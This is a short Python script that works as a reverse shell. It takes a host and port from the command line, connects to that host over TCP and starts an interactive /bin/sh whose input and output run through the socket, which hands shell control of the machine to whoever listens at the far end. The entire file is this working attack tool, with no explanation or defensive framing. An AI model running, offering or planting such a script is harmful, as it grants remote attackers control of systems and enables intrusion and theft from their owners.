#!/usr/bin/env python

import argparse
import os
import socket
import subprocess

p = argparse.ArgumentParser()
p.add_argument('host', type=str)
p.add_argument('port', type=int)
args = p.parse_args()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((args.host, args.port))
subprocess.Popen('/bin/sh -i',
                  shell=True, 
                  stdout=s.fileno(), 
                  stderr=s.fileno(), 
                  stdin=s.fileno())
